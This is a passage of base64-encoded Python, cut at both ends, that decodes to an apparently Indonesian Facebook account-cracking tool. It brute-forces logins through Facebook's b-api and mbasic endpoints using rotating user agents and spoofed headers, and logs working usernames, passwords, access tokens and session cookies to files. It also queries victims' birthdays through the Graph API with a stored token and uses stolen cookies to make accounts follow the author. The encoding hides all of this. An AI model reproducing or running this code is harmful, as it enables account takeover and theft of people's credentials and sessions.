CBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85MC4wLjQ0MzAuOTMgU2FmYXJpLzUzNy4zNiJdKQ0KICAgICAgICAgICAgaGVhZGVyID0geyJ1c2VyLWFnZW50IjogdWFfcGksIngtZmItY29ubmVjdGlvbi1iYW5kd2lkdGgiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAwMDAuMCwzMDAwMDAwMC4wKSksIngtZmItc2ltLWhu""aSI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCw0MDAwMCkpLCJ4LWZiLW5ldC1obmkiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsNDAwMDApKSwieC1mYi1jb25uZWN0aW9uLXF1YWxpdHkiOiAiRVhDRUxMRU5UIiwieC1mYi1jb25uZWN0aW9uLXR5cGUiOiAiY2VsbC5DVFJhZGlvQWNjZXNzVGVjaG5vbG9neUhTRFBBIiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsIngtZmItaHR0cC1lbmdpbmUiOiAiTGlnZXIifQ0KICAgICAgICAgICAgcmVzcG9uc2UgPSBzZXMuZ2V0KCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9mb3JtYXQ9anNvbiZlbWFpbD0nK3N0cih1c2VyKSsnJnBhc3N3b3JkPScrc3RyKHB3KSsnJmNyZWRlbnRpYWxzX3R5cGU9ZGV2aWNlX2Jhc2VkX2xvZ2luX3Bhc3N3b3JkJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJmVycm9yX2RldGFpbF90eXBlPWJ1dHRvbl93aXRoX2Rpc2FibGVkJnNvdXJjZT1kZXZpY2VfYmFzZWRfbG9naW4mbWV0YV9pbmZfZmJtZXRhPSUyMCZjdXJyZW50bHlfbG9nZ2VkX2luX3VzZXJpZD0wJm1ldGhvZD1HRVQmbG9jYWxlPWVuX1VTJmNsaWVudF9jb3VudHJ5X2NvZGU9VVMmZmJfYXBpX2NhbGxlcl9jbGFzcz1jb20uZmFjZWJvb2suZm9zLmhlYWRlcnN2Mi5mYjRhb3JjYS5IZWFkZXJzVjJDb25maWdGZXRjaFJlcXVlc3RIYW5kbGVyJmFjY2Vzc190b2tlbj0zNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzImZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lPWF1dGhlbnRpY2F0ZSZjcGw9dHJ1ZScsIGhlYWRlcnM9aGVhZGVyKS50ZXh0DQogICAgICAgICAgICBpZiAiQW5kYSBUaWRhayBEYXBhdCBNZW5nZ3VuYWthbiBGaXR1ciBJbmkgU2VrYXJhbmciIGluIHJlc3BvbnNlOg0KICAgICAgICAgICAgCWxvb3AgKz0xDQogICAgICAgICAgICAgICAgcHJpbnQgKCJcclwwMzNbMDs5MW3igKIgSVAgdGVyYmxva2lyLiBoaWR1cGthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayIpLA0KICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICAgICAgICAgIHNlbGYuYl9hcGkodXNlciwgbWFudWFsKQ0KICAgICAgICAgICAgaWYgJ3Nlc3Npb25fa2V5JyBpbiByZXNwb25zZSBhbmQgJ0VBQUEnIGluIHJlc3BvbnNlOg0KICAgICAgICAgICAgICAgIHByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAnICUgKEgsdXNlcixwdyxyZXNwb25zZS5qc29uKClbJ2FjY2Vzc190b2tlbiddKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcscmVzcG9uc2UuanNvbigpWydhY2Nlc3NfdG9rZW4nXSkpDQogICAgICAgICAgICAgICAgb3BlbignT0svJXMudHh0JyUod2FrdHUpLCAnYScpLndyaXRlKCcgKi0tPiAlcyDil4ogJXMg4peKICVzXG4nJSh1c2VyLHB3LHJlc3BvbnNlLmpzb24oKVsnYWNjZXNzX3Rva2VuJ10pKQ0KICAg""ICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiByZXNwb25zZS5qc29uKClbJ2Vycm9yX21zZyddOg0KICAgICAgICAgICAgICAgIGlmICJtdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgICAgIAl0cnk6DQogICAgICAgICAgICAgICAgCSAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAJICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgCSAgICBzZWxmLmNyNGNrKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgCSAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIGJyZWFrDQogICAgICAgICAgICAgICAgCWV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAJICAgIGRheSA9ICcnDQogICAgICAgICAgICAgICAgCSAgICBtb250aCA9ICcnDQogICAgICAgICAgICAgICAgCSAgICB5ZWFyICA9ICcnDQogICAgICAgICAgICAgICAgCWV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgICAgIAlzZWxmLmNyM2NrKHVzZXIscHcpDQogICAgICAgICAgICAgICAgCWNwLmFwcGVuZCgnJXMg4peKICVzJyUodXNlcixwdykpDQogICAgICAgICAgICAgICAgCW9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAJYnJlYWsNCiAgICAgICAgICAgICAgICBlbGlmICJna19tdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgICAgIAl0cnk6DQogICAgICAgICAgICAgICAgCSAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAJICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgCSAgICBwcmludCAnXHIgJXMqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXMgICcgJSAoSyx1c2VyLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAgICAgICAgIAkgICAgY3AuYXBwZW5kKCIlcyDil4ogJXMg""4peKICVzICVzICVzIiUodXNlcixwdyxkYXksbW9udGgseWVhcikpDQogICAgICAgICAgICAgICAgCSAgICBvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzXG4iJSAodXNlcixwdyxkYXksbW9udGgseWVhcikpDQogICAgICAgICAgICAgICAgCSAgICBicmVhaw0KICAgICAgICAgICAgICAgIAlleGNlcHQgS2V5RXJyb3I6DQogICAgICAgICAgICAgICAgCSAgICBkYXkgPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgbW9udGggPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgIAlleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1c2VyLHB3KQ0KICAgICAgICAgICAgICAgIAljcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgCWJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgIGxvb3AgKz0gMQ0KICAgICAgICB3YXJuYSA9IHJhbmRvbS5jaG9pY2UoW00sIEgsIEssIEIsIFUsIE8sIFBdKQ0KICAgICAgICBwcmludCgnXHInK3dhcm5hKyfigKJceDFiWzE7OTZtIFtjcmFja10gJXMvJXMgW09LOiVzXS1bQ1A6JXNdJyUobG9vcCxsZW4oc2VsZi5pZCksbGVuKG9rKSxsZW4oY3ApKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIyBNQkFTSUMNCiAgICBkZWYgYmFzaWMoc2VsZiwgdXNlciwgbWFudWFsLCoqZGF0YSk6DQogICAgCWdsb2JhbCBvayxjcCxsb29wDQogICAgCWlmICJyYW5kb20iIGluIHNlbGYudWdlbjoNCiAgICAJICAgIHRyeToNCiAgICAJICAgICAgICB1YSA9IHJhbmRvbS5jaG9pY2UoWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IGVuLWF1OyBTQU1TVU5HIFNNLU45MTVHIEJ1aWxkL0tUVTg0UCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLVEhNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8yLjAgQ2hyb21lLzM0LjAuMTg0Ny43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIk5va2lhWDMtMDIvNS4wICgwNi4wNSkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwi""TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSBRTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwiTm9raWFDMy0wMC81LjAgKDA3LjIwKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85MC4wLjQ0MzAuOTMgU2FmYXJpLzUzNy4zNiJdKQ0KICAgICAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgICAJdWEgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQogICAgICAgIGVsaWYgImdrX3JhbmRvbSIgaW4gc2VsZi51Z2VuOg0KICAgICAgICAJdHJ5Og0KICAgICAgICAJICAgIHVhID0gb3BlbigndWEudHh0JywgJ3InKS5yZWFkKCkNCiAgICAgICAgCWV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAJICAgIHVhID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZh""cmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdJw0KICAgICAgICBmb3IgcHcgaW4gbWFudWFsOiAgDQogICAgICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIHNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiJtYmFzaWMuZmFjZWJvb2suY29tIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJ1c2VyLWFnZW50Ijp1YSwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwiZG50IjoiMSIsIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjoibm9uZSIsInNlYy1mZXRjaC1tb2RlIjoibmF2aWdhdGUiLCJzZWMtZmV0Y2gtdXNlciI6Ij8xIiwic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsInJlZmVyZXIiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tLyIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyJ9KQ0KICAgICAgICAgICAgcCA9IHNlcy5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGJykudGV4dA0KICAgICAgICAgICAgZGF0YWEgPXsibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihwKSkuZ3JvdXAoMSksImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihwKSkuZ3JvdXAoMSksInVpZCI6dXNlciwiZmxvdyI6ImxvZ2luX25vX3BpbiIsInBhc3MiOnB3LCJuZXh0IjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9kZWJ1Zy9hY2Nlc3N0b2tlbi8ifQ0KICAgICAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6Im1iYXNpYy5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJvcmlnaW4iOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iLCJjb250ZW50LXR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCJ1c2VyLWFnZW50Ijp1YSwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwieC1yZXF1ZXN0ZWQtd2l0aCI6Im1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9y""aWdpbiIsInNlYy1mZXRjaC1tb2RlIjoibmF2aWdhdGUiLCJzZWMtZmV0Y2gtdXNlciI6Ij8xIiwic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsInJlZmVyZXIiOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyJ9KQ0KICAgICAgICAgICAgcG8gPSBzZXMucG9zdCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wJyxkYXRhPWRhdGFhLGFsbG93X3JlZGlyZWN0cz1GYWxzZSk7amVkYSgyKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgIAlrdWtpcz0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgcHJpbnQgKCdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAnJShILHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCclKHdha3R1KSwgJ2EnKS53cml0ZSgnICotLT4gJXMg4peKICVzIOKXiiAlc1xuJyUodXNlcixwdyxrdWtpcykpDQogICAgICAgICAgICAgICAgaWt1dGlfZ3coa3VraXMpDQogICAgICAgICAgICAgICAgYnJlYWsgDQogICAgICAgICAgICBlbGlmICdjaGVja3BvaW50JyBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgIGlmICJtdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgCSAgICB0cnk6DQogICAgICAgICAgICAJICAgICAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmNyNGNrKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1""c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgCWRheSA9ICcnDQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCAgID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgICAgIHNlbGYuY3IzY2sodXNlcixwdykNCiAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKCclcyDil4ogJXMnJSh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzXG4iICUgKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgImdrX211bmN1bCIgaW4gc2VsZi5vcHNpX2M6DQogICAgICAgICAgICAgICAgCXRyeToNCiAgICAgICAgICAgICAgICAJICAgIHJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcpLnJlYWQoKQ0KICAgICAgICAgICAgICAgIAkgICAgbGFoaXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyclKHVzZXIscm9teikpLmpzb24oKVsnYmlydGhkYXknXQ0KICAgICAgICAgICAgICAgIAkgICAgbW9udGgsIGRheSwgeWVhciA9IGxhaGlyLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAJICAgIHByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlcyAgJyAlIChLLHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgCSAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIGJyZWFrDQogICAgICAgICAgICAgICAgCWV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAJICAgIGRheSA9ICcnDQogICAgICAgICAgICAgICAgCSAgICBtb250aCAgID0gJycNCiAgICAgICAgICAgICAgICAJICAgIHllYXIgID0gJycNCiAgICAgICAgICAgICAgICAJZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgCXByaW50ICdcciAlcyotLT4gJXMg4peKICVzICAgICAgICAgICAnICUgKEssdXNlcixwdykNCiAgICAgICAgICAgICAgICAJY3AuYXBwZW5kKCclcyDil4ogJXMnJSh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAJb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzXG4iICUgKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlicmVhaw0KICAgICAgICAgICAgZWxz""ZToNCiAgICAgICAgICAgIAljb250aW51ZQ0KICAgICAgICBsb29wICs9IDENCiAgICAgICAgd2FybmEgPSByYW5kb20uY2hvaWNlKFtNLCBILCBLLCBCLCBVLCBPLCBQXSkNCiAgICAgICAgcHJpbnQoJ1xyJyt3YXJuYSsn4oCiXHgxYlsxOzk2bSBbY3JhY2tdICVzLyVzIFtPSzolc10tW0NQOiVzXSclKGxvb3AsbGVuKHNlbGYuaWQpLGxlbihvayksbGVuKGNwKSkpLA0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAjIE1PQklMRQ0KICAgIGRlZiBtb2JpbChzZWxmLCB1c2VyLCBtYW51YWwsKipkYXRhKToNCiAgICAJZ2xvYmFsIG9rLGNwLGxvb3ANCiAgICAJaWYgInJhbmRvbSIgaW4gc2VsZi51Z2VuOg0KICAgIAkgICAgdHJ5Og0KICAgIAkgICAgICAgIHVhID0gcmFuZG9tLmNob2ljZShbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjQuNDsgZW4tYXU7IFNBTVNVTkcgU00tTjkxNUcgQnVpbGQvS1RVODRQKSBBcHBsZVdlYktpdC81MzcuMzYgKEtUSE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzIuMCBDaHJvbWUvMzQuMC4xODQ3Ljc2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiTm9raWFYMy0wMi81LjAgKDA2LjA1KSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10iLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC4xLjI7IE5va2lhX1ggQnVpbGQvSlpPNTRLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMzAuMC4xNTk5LjgyIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE5va2lhQnJvd3Nlci8xLjIuMC4xMiIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjEuMTsgTmF2b3JpIFFMIFN0aXggMzUwMCBCdWlsZC9MTVk0OUY7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNjcuMC4z